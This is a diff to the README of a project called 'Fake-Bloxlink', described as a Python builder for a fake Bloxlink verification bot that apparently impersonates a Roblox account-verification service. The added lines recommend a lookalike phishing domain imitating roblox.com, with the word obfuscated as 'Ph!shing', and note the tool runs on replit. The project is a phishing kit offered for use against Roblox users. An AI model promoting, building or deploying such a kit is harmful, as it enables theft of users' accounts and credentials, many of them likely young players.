@@ -3,6 +3,8 @@
 # Fake-Bloxlink
 A Simple Python Builder for the fake Bloxlink verification bot
 
+Ph!shing link recommended : https://roblox.com.lv/
+
 ! Can be used on replit when file or code is created !
 
 # Usage
